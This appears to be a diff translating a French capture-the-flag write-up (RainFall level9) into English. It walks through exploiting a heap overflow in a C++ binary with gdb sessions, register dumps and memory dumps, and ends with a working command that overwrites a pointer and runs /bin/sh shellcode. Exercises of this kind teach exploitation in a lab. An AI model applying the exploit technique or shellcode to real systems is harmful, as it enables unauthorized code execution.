@@ -74,27 +74,27 @@ Dump of assembler code for function _ZN1N13setAnnotationEPc:
    0x08048739 <+43>:	ret    
 End of assembler dump.
 
-L'executable est a la base en C++.
+The binary is in C++;
 
-Si l'executable est appele sans argument on passe dans le exit.
-Sinon, on continue et on appelle 2 fois _Znwj@plt
-Cela permet d'allouer en memoire 2 instances de classes.
-Ensuite il y a un appel a _ZN1N13setAnnotationEPc.
+If we send no argument we go directly in the exit function.
+Else, we continue and call twice _Znwj@plt
+It allows the allocation in memory of 2 instances of classes.
+Then there is a call to _ZN1N13setAnnotationEPc.
 
-Si on la desassemble on peut y trouver un strlen et un memcpy.
-Apres verification on comprend que strlen compte sur l'arg 1
-et que memcpy copie le 1er arg dans une instance au prealablement allouee.
+If we disas the binary, we can find a strlen and memcpy.
+After check we understand strlen count on the first arg and
+memcpy copies the 1st arg in a previously allocated instance.
 
-On essaye de faire segfault le level9, on envoie une chaine avec un pattern assez long
-On trouve que l'offset est de 108.
+We try to make level9 segfault, we send a string pattern long enough and found
+the offset is a 108.
 
-Avec ca on peut commencer a chercher comment modifier eip.
-La stack etant executable on va pouvoir envoyer un shellcode :
+With that we can start looking on how to modify eip.
+The stack is executable, this means we can send a shellcode :
 
 level9@RainFall:~$ readelf -a level9 | grep "GNU_STACK"
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 
-On essaye d'aller plus loin que l'offset et observer la stack:
+We try to go further than the offset and take a look at the stack :
 
 (gdb) r $(python -c 'print "A" * 108 + "BBBB"')
 Starting program: /home/user/level9/level9 $(python -c 'print "A" * 108 + "BBBB"')
@@ -102,7 +102,7 @@ Starting program: /home/user/level9/level9 $(python -c 'print "A" * 108 + "BBBB"
 Program received signal SIGSEGV, Segmentation fault.
 0x08048682 in main ()
 
-Grace a ca on sait que le segfault a lieu a la ligne 142 du main.
+Thanks to that, we know that the segfault happens at the line 142 in the main.
 
 (gdb) i r
 eax            0x42424242	1111638594
@@ -122,9 +122,9 @@ es             0x7b	123
 fs             0x0	0
 gs             0x33	51
 
-On peut voir que eax et ecx sont set a 42424242, on a donc le controle dessus.
-On va donc envoyer une addresse a la place des BBBB qui pointe sur un autre
-endroit ou nous avons le controle.
+We can see that eax and ecx are set at 424242, we now have control on it.
+We're going to send an address instead of the BBBB which point to another place
+where which we are in control. 
 
 (gdb) x/100xw 0x804a00c
 0x804a00c:	0x41414141	0x41414141	0x41414141	0x41414141
@@ -136,10 +136,9 @@ endroit ou nous avons le controle.
 0x804a06c:	0x41414141	0x41414141	0x41414141	0x42424242
 0x804a07c:	0x00000000	0x00000000	0x00000000	0x00000000
 
-Voici l'addresse ou est stocke argv
+This is the address where argv is stocked
 
-Apres ajout de notre adresse :
-
+After adding our address :
 (gdb) r $(python -c 'print "A" * 108 + "\x0c\xa0\x04\x08"')
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -158,8 +157,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x804a05c:	0x41414141	0x41414141	0x41414141	0x41414141
 0x804a06c:	0x41414141	0x41414141	0x41414141	0x0804a00c
 
-On peut aussi voir que nous avons la main sur eip :
-
+We can see we are in control of eip :
 (gdb) i r
 eax            0x804a078	134520952
 ecx            0x804a00c	134520844
@@ -178,10 +176,10 @@ es             0x7b	123
 fs             0x0	0
 gs             0x33	51
 
-Ainsi il nous reste a faire pointer eip sur notre shellcode
-et voila !
+Then we need to make sure eip points to our shellcode and voila !
 
-./level9 [Addresse + 4 apres le debut du buffer] + [Padding] + [Shellcode] + [Addresse + 0 du buffer]
+
+./level9 [Address + 4 after buffer start] + [Padding] + [Shellcode] + [Address + 0 from buffer]
 
 level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x90" * 49 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x0c\xa0\x04\x08"')
 $ id
